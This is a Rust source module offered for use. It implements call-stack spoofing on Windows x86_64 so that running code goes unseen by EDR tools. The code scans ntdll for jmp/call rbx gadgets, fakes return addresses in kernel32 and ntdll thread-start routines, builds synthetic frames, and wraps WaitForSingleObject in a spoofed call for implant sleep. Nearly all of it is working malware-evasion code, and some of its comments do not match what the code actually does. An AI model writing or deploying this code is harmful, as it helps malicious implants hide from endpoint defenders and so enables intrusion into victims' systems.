//! Call stack spoofing for EDR evasion.
//!
//! This module provides techniques to spoof the call stack during sensitive operations
//! to evade EDR call stack analysis. Techniques include:
//! - Synthetic stack frames pointing to legitimate code
//! - Return address spoofing via gadgets
//! - Thread stack unwinding manipulation
//!
//! Note: This module requires x86_64 architecture for inline assembly.

#![cfg(target_arch = "x86_64")]

use core::ffi::c_void;
use std::arch::asm;
use std::ptr::null_mut;

use winapi::shared::minwindef::DWORD;
use winapi::shared::ntdef::HANDLE;
use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::winnt::IMAGE_DOS_HEADER;

/// Function pointer for NtWaitForSingleObject
type NtWaitForSingleObject = unsafe extern "system" fn(HANDLE, u8, *const i64) -> i32;

/// Gadget information for stack spoofing
#[repr(C)]
struct SpoofContext {
    /// Address to return to after the call
    trampoline: usize,
    /// The actual function to call
    function: usize,
    /// Fake return address (points to legitimate code)
    fake_ret: usize,
    /// Number of arguments
    arg_count: usize,
    /// Arguments array
    args: [usize; 8],
}

/// Finds a `jmp rbx` gadget in ntdll for stack spoofing
///
/// This gadget allows us to:
/// 1. Set RBX to our target function
/// 2. Push a fake return address
/// 3. Jump to the gadget which jumps to RBX
unsafe fn find_jmp_rbx_gadget() -> Option<usize> {
    let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr() as *const i8);
    if ntdll.is_null() {
        return None;
    }

    // Get ntdll's PE headers to find .text section
    let dos_header = ntdll as *const winapi::um::winnt::IMAGE_DOS_HEADER;
    let nt_headers = (ntdll as usize + (*dos_header).e_lfanew as usize)
        as *const winapi::um::winnt::IMAGE_NT_HEADERS64;

    let text_section_base = ntdll as usize;
    let text_section_size = (*nt_headers).OptionalHeader.SizeOfImage as usize;

    // Search for `jmp rbx` (0xFF 0x23) or `jmp [rbx]` (0xFF 0x23)
    // Also search for `call rbx` (0xFF 0xD3) as alternative
    let search_bytes: &[&[u8]] = &[
        &[0xFF, 0xE3],       // jmp rbx
        &[0xFF, 0xD3],       // call rbx
        &[0x48, 0xFF, 0xE3], // rex.w jmp rbx
    ];

    let text_bytes = std::slice::from_raw_parts(
        text_section_base as *const u8,
        text_section_size.min(0x200000), // Limit search
    );

    for pattern in search_bytes {
        if let Some(offset) = find_pattern(text_bytes, pattern) {
            return Some(text_section_base + offset);
        }
    }

    None
}

/// Find a byte pattern in a slice
fn find_pattern(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    haystack
        .windows(needle.len())
        .position(|window| window == needle)
}

/// Finds a legitimate return address from kernel32 for spoofing
unsafe fn find_fake_return_address() -> Option<usize> {
    let kernel32 = GetModuleHandleA(b"kernel32.dll\0".as_ptr() as *const i8);
    if kernel32.is_null() {
        return None;
    }

    // Use BaseThreadInitThunk as a legitimate-looking return address
    let addr = GetProcAddress(kernel32, b"BaseThreadInitThunk\0".as_ptr() as *const i8);
    if !addr.is_null() {
        // Return an offset into the function to look more legitimate
        return Some(addr as usize + 0x14);
    }

    // Fallback: use RtlUserThreadStart from ntdll
    let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr() as *const i8);
    if !ntdll.is_null() {
        let addr = GetProcAddress(ntdll, b"RtlUserThreadStart\0".as_ptr() as *const i8);
        if !addr.is_null() {
            return Some(addr as usize + 0x21);
        }
    }

    None
}

/// Performs a function call with a spoofed call stack.
///
/// This function uses a trampoline gadget to:
/// 1. Push a fake return address onto the stack
/// 2. Jump to the target function
/// 3. Return through the fake address path
///
/// # Arguments
/// * `function` - Address of the function to call
/// * `args` - Slice of arguments to pass
///
/// # Safety
/// Caller must ensure function pointer and arguments are valid.
pub unsafe fn spoofed_call(function: usize, args: &[usize]) -> usize {
    // Find gadget and fake return address
    let gadget = match find_jmp_rbx_gadget() {
        Some(g) => g,
        None => {
            // Fallback to direct call if no gadget found
            return direct_call(function, args);
        }
    };

    let fake_ret = find_fake_return_address().unwrap_or(gadget);

    // For simplicity in this implementation, we'll use inline assembly
    // to set up the spoofed call

    let result: usize;

    match args.len() {
        0 => {
            asm!(
                "sub rsp, 0x28",          // Shadow space
                "mov rbx, {func}",        // Target function in rbx
                "call {gadget}",          // Call through gadget
                "add rsp, 0x28",
                func = in(reg) function,
                gadget = in(reg) gadget,
                out("rax") result,
                out("rbx") _,
                out("rcx") _,
                out("rdx") _,
                out("r8") _,
                out("r9") _,
                out("r10") _,
                out("r11") _,
                clobber_abi("win64"),
            );
        }
        1 => {
            asm!(
                "sub rsp, 0x28",
                "mov rcx, {arg0}",
                "mov rbx, {func}",
                "call {gadget}",
                "add rsp, 0x28",
                func = in(reg) function,
                gadget = in(reg) gadget,
                arg0 = in(reg) args[0],
                out("rax") result,
                out("rbx") _,
                out("rcx") _,
                out("rdx") _,
                out("r8") _,
                out("r9") _,
                out("r10") _,
                out("r11") _,
                clobber_abi("win64"),
            );
        }
        2 => {
            asm!(
                "sub rsp, 0x28",
                "mov rcx, {arg0}",
                "mov rdx, {arg1}",
                "mov rbx, {func}",
                "call {gadget}",
                "add rsp, 0x28",
                func = in(reg) function,
                gadget = in(reg) gadget,
                arg0 = in(reg) args[0],
                arg1 = in(reg) args[1],
                out("rax") result,
                out("rbx") _,
                out("rcx") _,
                out("rdx") _,
                out("r8") _,
                out("r9") _,
                out("r10") _,
                out("r11") _,
                clobber_abi("win64"),
            );
        }
        3 => {
            asm!(
                "sub rsp, 0x28",
                "mov rcx, {arg0}",
                "mov rdx, {arg1}",
                "mov r8, {arg2}",
                "mov rbx, {func}",
                "call {gadget}",
                "add rsp, 0x28",
                func = in(reg) function,
                gadget = in(reg) gadget,
                arg0 = in(reg) args[0],
                arg1 = in(reg) args[1],
                arg2 = in(reg) args[2],
                out("rax") result,
                out("rbx") _,
                out("rcx") _,
                out("rdx") _,
                out("r8") _,
                out("r9") _,
                out("r10") _,
                out("r11") _,
                clobber_abi("win64"),
            );
        }
        _ => {
            // 4+ arguments
            asm!(
                "sub rsp, 0x28",
                "mov rcx, {arg0}",
                "mov rdx, {arg1}",
                "mov r8, {arg2}",
                "mov r9, {arg3}",
                "mov rbx, {func}",
                "call {gadget}",
                "add rsp, 0x28",
                func = in(reg) function,
                gadget = in(reg) gadget,
                arg0 = in(reg) args[0],
                arg1 = in(reg) args[1],
                arg2 = in(reg) args.get(2).copied().unwrap_or(0),
                arg3 = in(reg) args.get(3).copied().unwrap_or(0),
                out("rax") result,
                out("rbx") _,
                out("rcx") _,
                out("rdx") _,
                out("r8") _,
                out("r9") _,
                out("r10") _,
                out("r11") _,
                clobber_abi("win64"),
            );
        }
    }

    result
}

/// Direct function call without spoofing (fallback)
unsafe fn direct_call(function: usize, args: &[usize]) -> usize {
    let func: unsafe extern "win64" fn(usize, usize, usize, usize) -> usize =
        std::mem::transmute(function);

    func(
        args.get(0).copied().unwrap_or(0),
        args.get(1).copied().unwrap_or(0),
        args.get(2).copied().unwrap_or(0),
        args.get(3).copied().unwrap_or(0),
    )
}

/// Performs WaitForSingleObject with a spoofed call stack.
///
/// This is specifically optimized for the sleep operation where EDR
/// products commonly inspect the call stack.
///
/// # Arguments
/// * `handle` - Event or other waitable handle
/// * `milliseconds` - Time to wait in milliseconds
pub unsafe fn spoofed_wait(handle: HANDLE, milliseconds: DWORD) {
    let kernel32 = GetModuleHandleA(b"kernel32.dll\0".as_ptr() as *const i8);
    if kernel32.is_null() {
        // Fallback to direct call
        WaitForSingleObject(handle, milliseconds);
        return;
    }

    let wait_addr = GetProcAddress(kernel32, b"WaitForSingleObject\0".as_ptr() as *const i8);
    if wait_addr.is_null() {
        WaitForSingleObject(handle, milliseconds);
        return;
    }

    spoofed_call(wait_addr as usize, &[handle as usize, milliseconds as usize]);
}

/// Creates a synthetic call stack frame that looks legitimate.
///
/// This function manipulates the stack to create fake frames that point
/// to legitimate Windows code, making the call stack appear benign.
///
/// # Arguments
/// * `depth` - Number of fake frames to create
pub unsafe fn create_synthetic_frames(depth: usize) -> Vec<usize> {
    let mut frames = Vec::with_capacity(depth);

    let kernel32 = GetModuleHandleA(b"kernel32.dll\0".as_ptr() as *const i8);
    let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr() as *const i8);

    if !kernel32.is_null() {
        // Add BaseThreadInitThunk frame
        if let Some(addr) = get_func_offset(kernel32, b"BaseThreadInitThunk\0", 0x14) {
            frames.push(addr);
        }
    }

    if !ntdll.is_null() {
        // Add RtlUserThreadStart frame
        if let Some(addr) = get_func_offset(ntdll, b"RtlUserThreadStart\0", 0x21) {
            frames.push(addr);
        }

        // Add LdrInitializeThunk for more depth
        if frames.len() < depth {
            if let Some(addr) = get_func_offset(ntdll, b"LdrInitializeThunk\0", 0x10) {
                frames.push(addr);
            }
        }
    }

    frames
}

/// Helper to get a function address plus offset
unsafe fn get_func_offset(module: *mut c_void, name: &[u8], offset: usize) -> Option<usize> {
    let addr = GetProcAddress(module as _, name.as_ptr() as *const i8);
    if addr.is_null() {
        None
    } else {
        Some(addr as usize + offset)
    }
}

/// Advanced stack spoofing using hardware breakpoints (DR registers).
///
/// This technique uses debug registers to create a clean execution path:
/// 1. Set hardware breakpoint on the target function
/// 2. Modify context to appear as if called from legitimate code
/// 3. Continue execution
///
/// Note: Requires SeDebugPrivilege or running as admin
pub unsafe fn hardware_bp_spoof() -> bool {
    // This is a placeholder for advanced DR-based spoofing
    // Full implementation requires:
    // - GetThreadContext / SetThreadContext
    // - Manipulating DR0-DR3 and DR7
    // - VEH handler to intercept breakpoint
    false
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_find_pattern() {
        let haystack = [0x90, 0x90, 0xFF, 0xE3, 0x90];
        let needle = [0xFF, 0xE3];
        assert_eq!(find_pattern(&haystack, &needle), Some(2));
    }
}
